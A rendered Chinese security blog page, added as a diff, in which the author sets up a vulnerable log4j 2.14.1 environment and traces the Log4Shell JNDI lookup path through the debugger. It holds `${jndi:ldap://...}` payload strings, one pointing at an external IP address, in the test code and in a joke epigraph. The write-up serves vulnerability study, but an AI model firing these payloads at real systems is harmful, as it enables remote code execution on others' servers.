@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>log4j2 jndi 漏洞学习和调试 | ch4ser の 超元域</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+明天安全圈校招面试:
+面试官: 请说说你会什么技能?
+我: ${jndi:ldap://xxx.dnslog.cn/exp}
+面试官: 请说说你最近关注过的漏洞?
+我: ${jndi:ldap://xxx.dnslog.cn/exp}
+面试官: 你平时有动手调试过吗?
+我: ${jndi:ldap://xxx.dnslog.cn/exp}
+我：这dnslog是不是卡了 这面试官怎么还没rce">
+<meta name="author" content="ch4ser">
+<link rel="canonical" href="http://localhost:1313/posts/sec-log4j2-jndi/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.c88af8ef8fa9a2e5679da8d790b200b5b5b48dac79743ce84e8a9a6ef1471adb.css" integrity="sha256-yIr474&#43;pouVnnajXkLIAtbW0jax5dDzoToqabvFHGts=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/flash.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/flash.ico">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/flash.ico">
+<link rel="apple-touch-icon" href="http://localhost:1313/flash.ico">
+<link rel="mask-icon" href="http://localhost:1313/flash.ico">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/sec-log4j2-jndi/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="ch4ser の 超元域 (Alt + H)">
+                <img src="http://localhost:1313/avatar.jpg" alt="" aria-label="logo"
+                    height="35">ch4ser の 超元域</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/categories/" title="categories">
+                    <span>categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="about">
+                    <span>about</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      log4j2 jndi 漏洞学习和调试
+    </h1>
+    <div class="post-meta"><span title='2021-12-11 14:56:51 +0000 UTC'>December 11, 2021</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;77 words&nbsp;·&nbsp;ch4ser
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞调试">漏洞调试</a></li>
+    <li><a href="#漏洞利用">漏洞利用</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p>明天安全圈校招面试:
+面试官: 请说说你会什么技能?
+我: ${jndi:ldap://xxx.dnslog.cn/exp}
+面试官: 请说说你最近关注过的漏洞?
+我: ${jndi:ldap://xxx.dnslog.cn/exp}
+面试官: 你平时有动手调试过吗?
+我: ${jndi:ldap://xxx.dnslog.cn/exp}
+我：这dnslog是不是卡了 这面试官怎么还没rce</p></blockquote>
+<h2 id="环境搭建">环境搭建<a hidden class="anchor" aria-hidden="true" href="#环境搭建">#</a></h2>
+<p>新建maven项目, pom.xml写入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">    <span class="nt">&lt;dependencies&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;artifactId&gt;</span>log4j-api<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;version&gt;</span>2.14.1<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/dependencies&gt;</span>
+</span></span></code></pre></div><ol>
+<li>在官网 <a href="https://archive.apache.org/dist/logging/log4j/">https://archive.apache.org/dist/logging/log4j/</a> 下载log4j然后在project structure中导入</li>
+</ol>
+<p><img loading="lazy" src="/posts/sec-log4j2-jndi/2021-12-11-16-16-25.png"></p>
+<ol start="2">
+<li>下载低版本java8 <a href="https://repo.huaweicloud.com/java/jdk/">https://repo.huaweicloud.com/java/jdk/</a> 我下载的是8u181,将其作为java运行环境</li>
+</ol>
+<p><img loading="lazy" src="/posts/sec-log4j2-jndi/2021-12-11-16-24-14.png"></p>
+<p>写测试代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.LogManager</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.logging.log4j.Logger</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Main</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Logger</span><span class="w"> </span><span class="n">logger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LogManager</span><span class="p">.</span><span class="na">getLogger</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">logger</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;${jndi:ldap://39.105.176.37:1389/smzifq}&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><h2 id="漏洞调试">漏洞调试<a hidden class="anchor" aria-hidden="true" href="#漏洞调试">#</a></h2>
+<p>调试进入</p>
+<p><img alt="image-20211211152434057" loading="lazy" src="/posts/sec-log4j2-jndi/image-20211211152434057.png"></p>
+<p>调试到
+<img alt="image-20211211152611862" loading="lazy" src="/posts/sec-log4j2-jndi/image-20211211152611862.png"></p>
+<p>然后调试到<code>MessagePatternConverter#format</code>方法, 看到这里会试图匹配<code>${</code>字符.并将payload字符串解析到变量value中去.</p>
+<p><img alt="image-20211211152039629" loading="lazy" src="/posts/sec-log4j2-jndi/image-20211211152039629.png"></p>
+<p>步进replace函数, 再步进substitute函数
+<img alt="image-20211211152218136" loading="lazy" src="/posts/sec-log4j2-jndi/image-20211211152218136.png"></p>
+<p>此处的StrSubstitutor类负责扫描目标字符串的中的patterns，并使用不同pattern所对应的StrLookup resolver解析，其中的对应关系如下，后文还会提及。</p>
+<p><img alt="lookupresolver" loading="lazy" src="/posts/sec-log4j2-jndi/lookupresolver.png"></p>
+<p>进入下一个substitute中会看到它会匹配结尾的<code>}</code>
+<img loading="lazy" src="/posts/sec-log4j2-jndi/2021-12-11-15-56-47.png"></p>
+<p>再往下就可以看到<code>resolveVariable</code>方法被调用, 里面调用了<code>lookup</code>方法
+<img loading="lazy" src="/posts/sec-log4j2-jndi/2021-12-11-16-01-45.png"></p>
+<p><img alt="image-20211211152245317" loading="lazy" src="/posts/sec-log4j2-jndi/image-20211211152245317.png"></p>
+<p>在<code>lookup</code>方法中,会试图寻找<code>:</code>,并将<code>:</code>前面的部分作为prefix, 随后根据prefix来寻找类</p>
+<p><img loading="lazy" src="/posts/sec-log4j2-jndi/2021-12-11-16-06-13.png"></p>
+<p>可以看到这里规定了不同的prefix对应的类</p>
+<p><img alt="image-20211211150105597" loading="lazy" src="/posts/sec-log4j2-jndi/image-20211211150105597.png"></p>
+<p>使用的Jndi,所以使用的是<code>JndiLookup</code>类,调用了<code>JndiLookup#lookup</code>方法,并将<code>:</code>后面的部分作为参数传入.</p>
+<p><img alt="image-20211211150131696" loading="lazy" src="/posts/sec-log4j2-jndi/image-20211211150131696.png"></p>
+<p>最后调用到了<code>javax.naming.InitialContext#lookup</code>方法,server端收到请求
+<img loading="lazy" src="/posts/sec-log4j2-jndi/2021-12-11-16-11-46.png"></p>
+<p><img loading="lazy" src="/posts/sec-log4j2-jndi/2021-12-11-16-13-38.png"></p>
+<h2 id="漏洞利用">漏洞利用<a hidden class="anchor" aria-hidden="true" href="#漏洞利用">#</a></h2>
+<p>普通的jndi注入就可以了</p>
+<h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<p><a href="https://www.anquanke.com/post/id/262668#h3-5">https://www.anquanke.com/post/id/262668#h3-5</a></p>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/posts/sec-phpggc-thinkphp/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>thinkphp5漏洞学习</span>
+  </a>
+  <a class="next" href="http://localhost:1313/posts/gossip-cyberpunk/">
+    <span class="title">Next »</span>
+    <br>
+    <span>赛博内卷</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">ch4ser の 超元域</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
